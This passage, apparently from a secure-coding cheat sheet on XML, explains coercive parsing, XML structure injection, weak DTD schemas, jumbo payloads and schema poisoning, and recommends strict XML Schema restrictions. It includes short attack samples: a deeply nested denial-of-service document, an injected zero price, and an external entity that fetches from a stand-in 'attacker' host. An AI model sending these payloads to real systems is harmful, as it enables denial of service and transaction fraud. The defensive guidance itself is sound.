<span class="w"> </span><span class="ni">&amp;lt;</span>script<span class="ni">&amp;gt;</span>a=1;<span class="ni">&amp;lt;</span>/script<span class="ni">&amp;gt;</span>
<span class="nt">&lt;/element&gt;</span>
</code></pre></div>
<h3 id="handling-coercive-parsing">Handling coercive parsing<a class="headerlink" href="#handling-coercive-parsing" title="Permanent link">&para;</a></h3>
<p><strong>One popular coercive attack in XML involves parsing deeply nested XML documents without their corresponding ending tags. The idea is to make the victim use up -and eventually deplete- the machine's resources and cause a denial of service on the target.</strong> Reports of a DoS attack in Firefox 3.67 included the use of 30,000 open XML elements without their corresponding ending tags. Removing the closing tags simplified the attack since it requires only half of the size of a well-formed document to accomplish the same results. The number of tags being processed eventually caused a stack overflow. A simplified version of such a document would look like this:</p>
<div class="highlight"><pre><span></span><code><span class="nt">&lt;A1&gt;</span>
<span class="w"> </span><span class="nt">&lt;A2&gt;</span>
<span class="w">  </span><span class="nt">&lt;A3&gt;</span>
<span class="w">   </span>...
<span class="w">    </span><span class="nt">&lt;A30000&gt;</span>
</code></pre></div>
<h2 id="violation-of-xml-specification-rules">Violation of XML Specification Rules<a class="headerlink" href="#violation-of-xml-specification-rules" title="Permanent link">&para;</a></h2>
<p>Unexpected consequences may result from manipulating documents using parsers that do not follow W3C specifications. <strong>It may be possible to achieve crashes and/or code execution when the software does not properly verify how to handle incorrect XML structures. Feeding the software with fuzzed XML documents may expose this behavior.</strong></p>
<h2 id="dealing-with-invalid-xml-documents">Dealing with invalid XML documents<a class="headerlink" href="#dealing-with-invalid-xml-documents" title="Permanent link">&para;</a></h2>
<p><strong>Attackers may introduce unexpected values in documents to take advantage of an application that does not verify whether the document contains a valid set of values.</strong> Schemas specify restrictions that help identify whether documents are valid, and a valid document is well formed and complies with the restrictions of a schema. More than one schema can be used to validate a document, and these restrictions may appear in multiple files, either using a single schema language or relying on the strengths of the different schema languages.</p>
<p>The recommendation to avoid these vulnerabilities is that each XML document must have a precisely defined XML Schema (not <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a>) with every piece of information properly restricted to avoid problems of improper data validation. Use a local copy or a known good repository instead of the schema reference supplied in the XML document. Also, perform an integrity check of the XML schema file being referenced, bearing in mind the possibility that the repository could be compromised. In cases where the XML documents are using remote schemas, configure servers to use only secure, encrypted communications to prevent attackers from eavesdropping on network traffic.</p>
<h3 id="document-without-schema">Document without Schema<a class="headerlink" href="#document-without-schema" title="Permanent link">&para;</a></h3>
<p>Consider a bookseller that uses a web service through a web interface to make transactions. The XML document for transactions is composed of two elements: an <code>id</code> value related to an item and a certain <code>price</code>. The user may only introduce a certain <code>id</code> value using the web interface:</p>
<div class="highlight"><pre><span></span><code><span class="nt">&lt;buy&gt;</span>
<span class="w"> </span><span class="nt">&lt;id&gt;</span>123<span class="nt">&lt;/id&gt;</span>
<span class="w"> </span><span class="nt">&lt;price&gt;</span>10<span class="nt">&lt;/price&gt;</span>
<span class="nt">&lt;/buy&gt;</span>
</code></pre></div>
<p><strong>If there is no control on the document's structure, the application could also process different well-formed messages with unintended consequences. The previous document could have contained additional tags to affect the behavior of the underlying application processing its contents</strong>:</p>
<div class="highlight"><pre><span></span><code><span class="nt">&lt;buy&gt;</span>
<span class="w"> </span><span class="nt">&lt;id&gt;</span>123<span class="nt">&lt;/id&gt;&lt;price&gt;</span>0<span class="nt">&lt;/price&gt;&lt;id&gt;&lt;/id&gt;</span>
<span class="w"> </span><span class="nt">&lt;price&gt;</span>10<span class="nt">&lt;/price&gt;</span>
<span class="nt">&lt;/buy&gt;</span>
</code></pre></div>
<p>Notice again how the value 123 is supplied as an <code>id</code>, but now the document includes additional opening and closing tags. The attacker closed the <code>id</code> element and sets a bogus <code>price</code> element to the value 0. The final step to keep the structure well-formed is to add one empty <code>id</code> element. After this, the application adds the closing tag for <code>id</code> and set the <code>price</code> to 10. If the application processes only the first values provided for the ID and the value without performing any type of control on the structure, it could benefit the attacker by providing the ability to buy a book without actually paying for it.</p>
<h3 id="unrestrictive-schema">Unrestrictive Schema<a class="headerlink" href="#unrestrictive-schema" title="Permanent link">&para;</a></h3>
<p><strong>Certain schemas do not offer enough restrictions for the type of data that each element can receive.</strong> This is what normally happens when using <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a>; it has a very limited set of possibilities compared to the type of restrictions that can be applied in XML documents. This could expose the application to undesired values within elements or attributes that would be easy to constrain when using other schema languages. In the following example, a person's <code>age</code> is validated against an inline <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a> schema:</p>
<div class="highlight"><pre><span></span><code><span class="cp">&lt;!DOCTYPE person [</span>
<span class="cp"> &lt;!ELEMENT person (name, age)&gt;</span>
<span class="w"> </span><span class="cp">&lt;!ELEMENT name (#PCDATA)&gt;</span>
<span class="w"> </span><span class="cp">&lt;!ELEMENT age (#PCDATA)&gt;</span>
]&gt;
<span class="nt">&lt;person&gt;</span>
<span class="w"> </span><span class="nt">&lt;name&gt;</span>John<span class="w"> </span>Doe<span class="nt">&lt;/name&gt;</span>
<span class="w"> </span><span class="nt">&lt;age&gt;</span>11111..(1.000.000digits)..11111<span class="nt">&lt;/age&gt;</span>
<span class="nt">&lt;/person&gt;</span>
</code></pre></div>
<p>The previous document contains an inline <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a> with a root element named <code>person</code>. This element contains two elements in a specific order: <code>name</code> and then <code>age</code>. The element <code>name</code> is then defined to contain <code>PCDATA</code> as well as the element <code>age</code>.</p>
<p>After this definition begins the well-formed and valid XML document. The element name contains an irrelevant value but the <code>age</code> element contains one million digits. Since there are no restrictions on the maximum size for the <code>age</code> element, this one-million-digit string could be sent to the server for this element.</p>
<p>Typically this type of element should be restricted to contain no more than a certain amount of characters and constrained to a certain set of characters (for example, digits from 0 to 9, the + sign and the - sign). If not properly restricted, applications may handle potentially invalid values contained in documents.</p>
<p>Since it is not possible to indicate specific restrictions (a maximum length for the element <code>name</code> or a valid range for the element <code>age</code>), this type of schema increases the risk of affecting the integrity and availability of resources.</p>
<h3 id="improper-data-validation">Improper Data Validation<a class="headerlink" href="#improper-data-validation" title="Permanent link">&para;</a></h3>
<p><strong>When schemas are insecurely defined and do not provide strict rules, they may expose the application to diverse situations. The result of this could be the disclosure of internal errors or documents that hit the application's functionality with unexpected values.</strong></p>
<h4 id="string-data-types">String Data Types<a class="headerlink" href="#string-data-types" title="Permanent link">&para;</a></h4>
<p>Provided you need to use a hexadecimal value, there is no point in defining this value as a string that will later be restricted to the specific 16 hexadecimal characters. To exemplify this scenario, when using XML encryption some values must be encoded using base64 . This is the schema definition of how these values should look:</p>
<div class="highlight"><pre><span></span><code><span class="nt">&lt;element</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;CipherData&quot;</span><span class="w"> </span><span class="na">type=</span><span class="s">&quot;xenc:CipherDataType&quot;</span><span class="nt">/&gt;</span>
<span class="w"> </span><span class="nt">&lt;complexType</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;CipherDataType&quot;</span><span class="nt">&gt;</span>
<span class="w">  </span><span class="nt">&lt;choice&gt;</span>
<span class="w">   </span><span class="nt">&lt;element</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;CipherValue&quot;</span><span class="w"> </span><span class="na">type=</span><span class="s">&quot;base64Binary&quot;</span><span class="nt">/&gt;</span>
<span class="w">   </span><span class="nt">&lt;element</span><span class="w"> </span><span class="na">ref=</span><span class="s">&quot;xenc:CipherReference&quot;</span><span class="nt">/&gt;</span>
<span class="w">  </span><span class="nt">&lt;/choice&gt;</span>
<span class="w"> </span><span class="nt">&lt;/complexType&gt;</span>
</code></pre></div>
<p>The previous schema defines the element <code>CipherValue</code> as a base64 data type. As an example, the IBM WebSphere DataPower SOA Appliance allowed any type of characters within this element after a valid base64 value, and will consider it valid.</p>
<p>The first portion of this data is properly checked as a base64 value, but the remaining characters could be anything else (including other sub-elements of the <code>CipherData</code> element). Restrictions are partially set for the element, which means that the information is probably tested using an application instead of the proposed sample schema.</p>
<h4 id="numeric-data-types">Numeric Data Types<a class="headerlink" href="#numeric-data-types" title="Permanent link">&para;</a></h4>
<p><strong>Defining the correct data type for numbers can be more complex since there are more options than there are for strings.</strong></p>
<h5 id="negative-and-positive-restrictions">Negative and Positive Restrictions<a class="headerlink" href="#negative-and-positive-restrictions" title="Permanent link">&para;</a></h5>
<p>XML Schema numeric data types can include different ranges of numbers. They can include:</p>
<ul>
<li><strong>negativeInteger</strong>: Only negative numbers</li>
<li><strong>nonNegativeInteger</strong>: Positive numbers and the zero value</li>
<li><strong>positiveInteger</strong>: Only positive numbers</li>
<li><strong>nonPositiveInteger</strong>: Negative numbers and the zero value</li>
</ul>
<p>The following sample document defines an <code>id</code> for a product, a <code>price</code>, and a <code>quantity</code> value that is under the control of an attacker:</p>
<div class="highlight"><pre><span></span><code><span class="nt">&lt;buy&gt;</span>
<span class="w"> </span><span class="nt">&lt;id&gt;</span>1<span class="nt">&lt;/id&gt;</span>
<span class="w"> </span><span class="nt">&lt;price&gt;</span>10<span class="nt">&lt;/price&gt;</span>
<span class="w"> </span><span class="nt">&lt;quantity&gt;</span>1<span class="nt">&lt;/quantity&gt;</span>
<span class="nt">&lt;/buy&gt;</span>
</code></pre></div>
<p><strong>To avoid repeating old errors, an XML schema may be defined to prevent processing the incorrect structure in cases where an attacker wants to introduce additional elements:</strong></p>
<div class="highlight"><pre><span></span><code><span class="nt">&lt;xs:schema</span><span class="w"> </span><span class="na">xmlns:xs=</span><span class="s">&quot;http://www.w3.org/2001/XMLSchema&quot;</span><span class="nt">&gt;</span>
<span class="w"> </span><span class="nt">&lt;xs:element</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;buy&quot;</span><span class="nt">&gt;</span>
<span class="w">  </span><span class="nt">&lt;xs:complexType&gt;</span>
<span class="w">   </span><span class="nt">&lt;xs:sequence&gt;</span>
<span class="w">    </span><span class="nt">&lt;xs:element</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;id&quot;</span><span class="w"> </span><span class="na">type=</span><span class="s">&quot;xs:integer&quot;</span><span class="nt">/&gt;</span>
<span class="w">    </span><span class="nt">&lt;xs:element</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;price&quot;</span><span class="w"> </span><span class="na">type=</span><span class="s">&quot;xs:decimal&quot;</span><span class="nt">/&gt;</span>
<span class="w">    </span><span class="nt">&lt;xs:element</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;quantity&quot;</span><span class="w"> </span><span class="na">type=</span><span class="s">&quot;xs:integer&quot;</span><span class="nt">/&gt;</span>
<span class="w">   </span><span class="nt">&lt;/xs:sequence&gt;</span>
<span class="w">  </span><span class="nt">&lt;/xs:complexType&gt;</span>
<span class="w"> </span><span class="nt">&lt;/xs:element&gt;</span>
<span class="nt">&lt;/xs:schema&gt;</span>
</code></pre></div>
<p>Limiting that <code>quantity</code> to an integer data type will avoid any unexpected characters. Once the application receives the previous message, it may calculate the final price by doing <code>price*quantity</code>. <strong>However, since this data type may allow negative values, it might allow a negative result on the user's account if an attacker provides a negative number. What you probably want to see in here to avoid that logical vulnerability is positiveInteger instead of integer.</strong></p>
<h5 id="divide-by-zero">Divide by Zero<a class="headerlink" href="#divide-by-zero" title="Permanent link">&para;</a></h5>
<p><strong>Whenever using user controlled values as denominators in a division, developers should avoid allowing the number zero. In cases where the value zero is used for division in XSLT, the error <code>FOAR0001</code> will occur. Other applications may throw other exceptions and the program may crash.</strong> There are specific data types for XML schemas that specifically avoid using the zero value. For example, in cases where negative values and zero are not considered valid, the schema could specify the data type <code>positiveInteger</code> for the element.</p>
<div class="highlight"><pre><span></span><code><span class="nt">&lt;xs:element</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;denominator&quot;</span><span class="nt">&gt;</span>
<span class="w"> </span><span class="nt">&lt;xs:simpleType&gt;</span>
<span class="w">  </span><span class="nt">&lt;xs:restriction</span><span class="w"> </span><span class="na">base=</span><span class="s">&quot;xs:positiveInteger&quot;</span><span class="nt">/&gt;</span>
<span class="w"> </span><span class="nt">&lt;/xs:simpleType&gt;</span>
<span class="nt">&lt;/xs:element&gt;</span>
</code></pre></div>
<p>The element <code>denominator</code> is now restricted to positive integers. This means that only values greater than zero will be considered valid. If you see any other type of restriction being used, you may trigger an error if the denominator is zero.</p>
<h5 id="special-values-infinity-and-not-a-number-nan">Special Values: Infinity and Not a Number (NaN)<a class="headerlink" href="#special-values-infinity-and-not-a-number-nan" title="Permanent link">&para;</a></h5>
<p>The data types <code>float</code> and <code>double</code> contain real numbers and some special values: <code>-Infinity</code> or <code>-INF</code>, <code>NaN</code>, and <code>+Infinity</code> or <code>INF</code>. These possibilities may be useful to express certain values, but they are sometimes misused. The problem is that they are commonly used to express only real numbers such as prices. This is a common error seen in other programming languages, not solely restricted to these technologies.</p>
<p>Not considering the whole spectrum of possible values for a data type could make underlying applications fail. <strong>If the special values <code>Infinity</code> and <code>NaN</code> are not required and only real numbers are expected, the data type <code>decimal</code> is recommended:</strong></p>
<div class="highlight"><pre><span></span><code><span class="nt">&lt;xs:schema</span><span class="w"> </span><span class="na">xmlns:xs=</span><span class="s">&quot;http://www.w3.org/2001/XMLSchema&quot;</span><span class="nt">&gt;</span>
<span class="w"> </span><span class="nt">&lt;xs:element</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;buy&quot;</span><span class="nt">&gt;</span>
<span class="w">  </span><span class="nt">&lt;xs:complexType&gt;</span>
<span class="w">   </span><span class="nt">&lt;xs:sequence&gt;</span>
<span class="w">    </span><span class="nt">&lt;xs:element</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;id&quot;</span><span class="w"> </span><span class="na">type=</span><span class="s">&quot;xs:integer&quot;</span><span class="nt">/&gt;</span>
<span class="w">    </span><span class="nt">&lt;xs:element</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;price&quot;</span><span class="w"> </span><span class="na">type=</span><span class="s">&quot;xs:decimal&quot;</span><span class="nt">/&gt;</span>
<span class="w">    </span><span class="nt">&lt;xs:element</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;quantity&quot;</span><span class="w"> </span><span class="na">type=</span><span class="s">&quot;xs:positiveInteger&quot;</span><span class="nt">/&gt;</span>
<span class="w">   </span><span class="nt">&lt;/xs:sequence&gt;</span>
<span class="w">  </span><span class="nt">&lt;/xs:complexType&gt;</span>
<span class="w"> </span><span class="nt">&lt;/xs:element&gt;</span>
<span class="nt">&lt;/xs:schema&gt;</span>
</code></pre></div>
<p><strong>The price value will not trigger any errors when set at Infinity or NaN, because these values will not be valid. An attacker can exploit this issue if those values are allowed.</strong></p>
<h4 id="general-data-restrictions">General Data Restrictions<a class="headerlink" href="#general-data-restrictions" title="Permanent link">&para;</a></h4>
<p>After selecting the appropriate data type, developers may apply additional restrictions. Sometimes only a certain subset of values within a data type will be considered valid:</p>
<h5 id="prefixed-values">Prefixed Values<a class="headerlink" href="#prefixed-values" title="Permanent link">&para;</a></h5>
<p><strong>Certain types of values should only be restricted to specific sets: traffic lights will have only three types of colors, only 12 months are available, and so on. It is possible that the schema has these restrictions in place for each element or attribute. This is the most perfect allow-list scenario for an application: only specific values will be accepted. Such a constraint is called <code>enumeration</code> in an XML schema.</strong> The following example restricts the contents of the element month to 12 possible values:</p>
<div class="highlight"><pre><span></span><code><span class="nt">&lt;xs:element</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;month&quot;</span><span class="nt">&gt;</span>
<span class="w"> </span><span class="nt">&lt;xs:simpleType&gt;</span>
<span class="w">  </span><span class="nt">&lt;xs:restriction</span><span class="w"> </span><span class="na">base=</span><span class="s">&quot;xs:string&quot;</span><span class="nt">&gt;</span>
<span class="w">   </span><span class="nt">&lt;xs:enumeration</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;January&quot;</span><span class="nt">/&gt;</span>
<span class="w">   </span><span class="nt">&lt;xs:enumeration</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;February&quot;</span><span class="nt">/&gt;</span>
<span class="w">   </span><span class="nt">&lt;xs:enumeration</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;March&quot;</span><span class="nt">/&gt;</span>
<span class="w">   </span><span class="nt">&lt;xs:enumeration</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;April&quot;</span><span class="nt">/&gt;</span>
<span class="w">   </span><span class="nt">&lt;xs:enumeration</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;May&quot;</span><span class="nt">/&gt;</span>
<span class="w">   </span><span class="nt">&lt;xs:enumeration</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;June&quot;</span><span class="nt">/&gt;</span>
<span class="w">   </span><span class="nt">&lt;xs:enumeration</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;July&quot;</span><span class="nt">/&gt;</span>
<span class="w">   </span><span class="nt">&lt;xs:enumeration</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;August&quot;</span><span class="nt">/&gt;</span>
<span class="w">   </span><span class="nt">&lt;xs:enumeration</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;September&quot;</span><span class="nt">/&gt;</span>
<span class="w">   </span><span class="nt">&lt;xs:enumeration</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;October&quot;</span><span class="nt">/&gt;</span>
<span class="w">   </span><span class="nt">&lt;xs:enumeration</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;November&quot;</span><span class="nt">/&gt;</span>
<span class="w">   </span><span class="nt">&lt;xs:enumeration</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;December&quot;</span><span class="nt">/&gt;</span>
<span class="w">  </span><span class="nt">&lt;/xs:restriction&gt;</span>
<span class="w"> </span><span class="nt">&lt;/xs:simpleType&gt;</span>
<span class="nt">&lt;/xs:element&gt;</span>
</code></pre></div>
<p>By limiting the month element's value to any of the previous values, the application will not be manipulating random strings.</p>
<h5 id="ranges">Ranges<a class="headerlink" href="#ranges" title="Permanent link">&para;</a></h5>
<p>Software applications, databases, and programming languages normally store information within specific ranges. <strong>Whenever using an element or an attribute in locations where certain specific sizes matter (to avoid overflows or underflows), it would be logical to check whether the data length is considered valid.</strong> The following schema could constrain a name using a minimum and a maximum length to avoid unusual scenarios:</p>
<div class="highlight"><pre><span></span><code><span class="nt">&lt;xs:element</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;name&quot;</span><span class="nt">&gt;</span>
<span class="w"> </span><span class="nt">&lt;xs:simpleType&gt;</span>
<span class="w">  </span><span class="nt">&lt;xs:restriction</span><span class="w"> </span><span class="na">base=</span><span class="s">&quot;xs:string&quot;</span><span class="nt">&gt;</span>
<span class="w">   </span><span class="nt">&lt;xs:minLength</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;3&quot;</span><span class="nt">/&gt;</span>
<span class="w">   </span><span class="nt">&lt;xs:maxLength</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;256&quot;</span><span class="nt">/&gt;</span>
<span class="w">  </span><span class="nt">&lt;/xs:restriction&gt;</span>
<span class="w"> </span><span class="nt">&lt;/xs:simpleType&gt;</span>
<span class="nt">&lt;/xs:element&gt;</span>
</code></pre></div>
<p>In cases where the possible values are restricted to a certain specific length (let's say 8), this value can be specified as follows to be valid:</p>
<div class="highlight"><pre><span></span><code><span class="nt">&lt;xs:element</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;name&quot;</span><span class="nt">&gt;</span>
<span class="w"> </span><span class="nt">&lt;xs:simpleType&gt;</span>
<span class="w">  </span><span class="nt">&lt;xs:restriction</span><span class="w"> </span><span class="na">base=</span><span class="s">&quot;xs:string&quot;</span><span class="nt">&gt;</span>
<span class="w">   </span><span class="nt">&lt;xs:length</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;8&quot;</span><span class="nt">/&gt;</span>
<span class="w">  </span><span class="nt">&lt;/xs:restriction&gt;</span>
<span class="w"> </span><span class="nt">&lt;/xs:simpleType&gt;</span>
<span class="nt">&lt;/xs:element&gt;</span>
</code></pre></div>
<h5 id="patterns">Patterns<a class="headerlink" href="#patterns" title="Permanent link">&para;</a></h5>
<p>Certain elements or attributes may follow a specific syntax. You can add <code>pattern</code> restrictions when using XML schemas. <strong>When you want to ensure that the data complies with a specific pattern, you can create a specific definition for it. Social security numbers (SSN) may serve as a good example; they must use a specific set of characters, a specific length, and a specific <code>pattern</code>:</strong></p>
<div class="highlight"><pre><span></span><code><span class="nt">&lt;xs:element</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;SSN&quot;</span><span class="nt">&gt;</span>
<span class="w"> </span><span class="nt">&lt;xs:simpleType&gt;</span>
<span class="w">  </span><span class="nt">&lt;xs:restriction</span><span class="w"> </span><span class="na">base=</span><span class="s">&quot;xs:token&quot;</span><span class="nt">&gt;</span>
<span class="w">   </span><span class="nt">&lt;xs:pattern</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;[0-9]{3}-[0-9]{2}-[0-9]{4}&quot;</span><span class="nt">/&gt;</span>
<span class="w">  </span><span class="nt">&lt;/xs:restriction&gt;</span>
<span class="w"> </span><span class="nt">&lt;/xs:simpleType&gt;</span>
<span class="nt">&lt;/xs:element&gt;</span>
</code></pre></div>
<p>Only numbers between <code>000-00-0000</code> and <code>999-99-9999</code> will be allowed as values for a SSN.</p>
<h5 id="assertions">Assertions<a class="headerlink" href="#assertions" title="Permanent link">&para;</a></h5>
<p><strong>Assertion components constrain the existence and values of related elements and attributes on XML schemas. An element or attribute will be considered valid with regard to an assertion only if the test evaluates to true without raising any error. The variable <code>$value</code> can be used to reference the contents of the value being analyzed.</strong></p>
<p>The <em>Divide by Zero</em> section above referenced the potential consequences of using data types containing the zero value for denominators, proposing a data type containing only positive values. An opposite example would consider valid the entire range of numbers except zero. To avoid disclosing potential errors, values could be checked using an <code>assertion</code> disallowing the number zero:</p>
<div class="highlight"><pre><span></span><code><span class="nt">&lt;xs:element</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;denominator&quot;</span><span class="nt">&gt;</span>
<span class="w"> </span><span class="nt">&lt;xs:simpleType&gt;</span>
<span class="w">  </span><span class="nt">&lt;xs:restriction</span><span class="w"> </span><span class="na">base=</span><span class="s">&quot;xs:integer&quot;</span><span class="nt">&gt;</span>
<span class="w">   </span><span class="nt">&lt;xs:assertion</span><span class="w"> </span><span class="na">test=</span><span class="s">&quot;$value != 0&quot;</span><span class="nt">/&gt;</span>
<span class="w">  </span><span class="nt">&lt;/xs:restriction&gt;</span>
<span class="w"> </span><span class="nt">&lt;/xs:simpleType&gt;</span>
<span class="nt">&lt;/xs:element&gt;</span>
</code></pre></div>
<p>The assertion guarantees that the <code>denominator</code> will not contain the value zero as a valid number and also allows negative numbers to be a valid denominator.</p>
<h5 id="occurrences">Occurrences<a class="headerlink" href="#occurrences" title="Permanent link">&para;</a></h5>
<p><strong>The consequences of not defining a maximum number of occurrences could be worse than coping with the consequences of what may happen when receiving extreme numbers of items to be processed.</strong> Two attributes specify minimum and maximum limits: <code>minOccurs</code> and <code>maxOccurs</code>.</p>
<p>The default value for both the <code>minOccurs</code> and the <code>maxOccurs</code> attributes is <code>1</code>, but certain elements may require other values. For instance, if a value is optional, it could contain a <code>minOccurs</code> of 0, and if there is no limit on the maximum amount, it could contain a <code>maxOccurs</code> of <code>unbounded</code>, as in the following example:</p>
<div class="highlight"><pre><span></span><code><span class="nt">&lt;xs:schema</span><span class="w"> </span><span class="na">xmlns:xs=</span><span class="s">&quot;http://www.w3.org/2001/XMLSchema&quot;</span><span class="nt">&gt;</span>
<span class="w"> </span><span class="nt">&lt;xs:element</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;operation&quot;</span><span class="nt">&gt;</span>
<span class="w">  </span><span class="nt">&lt;xs:complexType&gt;</span>
<span class="w">   </span><span class="nt">&lt;xs:sequence&gt;</span>
<span class="w">    </span><span class="nt">&lt;xs:element</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;buy&quot;</span><span class="w"> </span><span class="na">maxOccurs=</span><span class="s">&quot;unbounded&quot;</span><span class="nt">&gt;</span>
<span class="w">     </span><span class="nt">&lt;xs:complexType&gt;</span>
<span class="w">      </span><span class="nt">&lt;xs:all&gt;</span>
<span class="w">       </span><span class="nt">&lt;xs:element</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;id&quot;</span><span class="w"> </span><span class="na">type=</span><span class="s">&quot;xs:integer&quot;</span><span class="nt">/&gt;</span>
<span class="w">       </span><span class="nt">&lt;xs:element</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;price&quot;</span><span class="w"> </span><span class="na">type=</span><span class="s">&quot;xs:decimal&quot;</span><span class="nt">/&gt;</span>
<span class="w">       </span><span class="nt">&lt;xs:element</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;quantity&quot;</span><span class="w"> </span><span class="na">type=</span><span class="s">&quot;xs:integer&quot;</span><span class="nt">/&gt;</span>
<span class="w">      </span><span class="nt">&lt;/xs:all&gt;</span>
<span class="w">     </span><span class="nt">&lt;/xs:complexType&gt;</span>
<span class="w">    </span><span class="nt">&lt;/xs:element&gt;</span>
<span class="w">  </span><span class="nt">&lt;/xs:complexType&gt;</span>
<span class="w"> </span><span class="nt">&lt;/xs:element&gt;</span>
<span class="nt">&lt;/xs:schema&gt;</span>
</code></pre></div>
<p>The previous schema includes a root element named <code>operation</code>, which can contain an unlimited (<code>unbounded</code>) amount of buy elements. This is a common finding, since developers do not normally want to restrict maximum numbers of occurrences. <strong>Applications using limitless occurrences should test what happens when they receive an extremely large amount of elements to be processed. Since computational resources are limited, the consequences should be analyzed and eventually a maximum number ought to be used instead of an <code>unbounded</code> value.</strong></p>
<h3 id="jumbo-payloads">Jumbo Payloads<a class="headerlink" href="#jumbo-payloads" title="Permanent link">&para;</a></h3>
<p><strong>Sending an XML document of 1GB requires only a second of server processing and might not be worth consideration as an attack. Instead, an attacker would look for a way to minimize the CPU and traffic used to generate this type of attack, compared to the overall amount of server CPU or traffic used to handle the requests.</strong></p>
<h4 id="traditional-jumbo-payloads">Traditional Jumbo Payloads<a class="headerlink" href="#traditional-jumbo-payloads" title="Permanent link">&para;</a></h4>
<p><strong>There are two primary methods to make a document larger than normal:</strong></p>
<p><strong>- Depth attack: using a huge number of elements, element names, and/or element values.</strong></p>
<p><strong>- Width attack: using a huge number of attributes, attribute names, and/or attribute values.</strong></p>
<p>In most cases, the overall result will be a huge document. This is a short example of what this looks like:</p>
<div class="highlight"><pre><span></span><code><span class="nt">&lt;SOAPENV:ENVELOPE</span><span class="w"> </span><span class="na">XMLNS:SOAPENV=</span><span class="s">&quot;HTTP://SCHEMAS.XMLSOAP.ORG/SOAP/ENVELOPE/&quot;</span>
<span class="w">                  </span><span class="na">XMLNS:EXT=</span><span class="s">&quot;HTTP://COM/IBM/WAS/WSSAMPLE/SEI/ECHO/B2B/EXTERNAL&quot;</span><span class="nt">&gt;</span>
<span class="w"> </span><span class="nt">&lt;SOAPENV:HEADER</span><span class="w"> </span><span class="na">LARGENAME1=</span><span class="s">&quot;LARGEVALUE&quot;</span>
<span class="w">                 </span><span class="na">LARGENAME2=</span><span class="s">&quot;LARGEVALUE2&quot;</span>
<span class="w">                 </span><span class="na">LARGENAME3=</span><span class="s">&quot;LARGEVALUE3&quot;</span><span class="w"> </span><span class="err">…</span><span class="nt">&gt;</span>
<span class="w"> </span>...
</code></pre></div>
<h4 id="small-jumbo-payloads">"Small" Jumbo Payloads<a class="headerlink" href="#small-jumbo-payloads" title="Permanent link">&para;</a></h4>
<p><strong>The following example is a very small document, but the results of processing this could be similar to those of processing traditional jumbo payloads.</strong> The purpose of such a small payload is that it allows an attacker to send many documents fast enough to make the application consume most or all of the available resources:</p>
<div class="highlight"><pre><span></span><code><span class="cp">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
<span class="cp">&lt;!DOCTYPE root [</span>
<span class="cp"> &lt;!ENTITY file SYSTEM &quot;http://attacker/huge.xml&quot; &gt;</span>
]&gt;
<span class="nt">&lt;root&gt;</span><span class="ni">&amp;file;</span><span class="nt">&lt;/root&gt;</span>
</code></pre></div>
<h3 id="schema-poisoning">Schema Poisoning<a class="headerlink" href="#schema-poisoning" title="Permanent link">&para;</a></h3>
<p><strong>When an attacker is capable of introducing modifications to a schema, there could be multiple high-risk consequences. In particular, the effect of these consequences will be more dangerous if the schemas are using <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a> (e.g., file retrieval, denial of service).</strong> An attacker could exploit this type of vulnerability in numerous scenarios, always depending on the location of the schema.</p>
<h4 id="local-schema-poisoning">Local Schema Poisoning<a class="headerlink" href="#local-schema-poisoning" title="Permanent link">&para;</a></h4>
<p><strong>Local schema poisoning happens when schemas are available in the same host, whether or not the schemas are embedded in the same XML document.</strong></p>
<h5 id="embedded-schema">Embedded Schema<a class="headerlink" href="#embedded-schema" title="Permanent link">&para;</a></h5>
<p><strong>The most trivial type of schema poisoning takes place when the schema is defined within the same XML document.</strong> Consider the following, unknowingly vulnerable example provided by the W3C :</p>
<div class="highlight"><pre><span></span><code><span class="cp">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
<span class="cp">&lt;!DOCTYPE note [</span>
<span class="cp"> &lt;!ELEMENT note (to,from,heading,body)&gt;</span>
<span class="w"> </span><span class="cp">&lt;!ELEMENT to (#PCDATA)&gt;</span>
<span class="w"> </span><span class="cp">&lt;!ELEMENT from (#PCDATA)&gt;</span>
<span class="w"> </span><span class="cp">&lt;!ELEMENT heading (#PCDATA)&gt;</span>
<span class="w"> </span><span class="cp">&lt;!ELEMENT body (#PCDATA)&gt;</span>
]&gt;
<span class="nt">&lt;note&gt;</span>
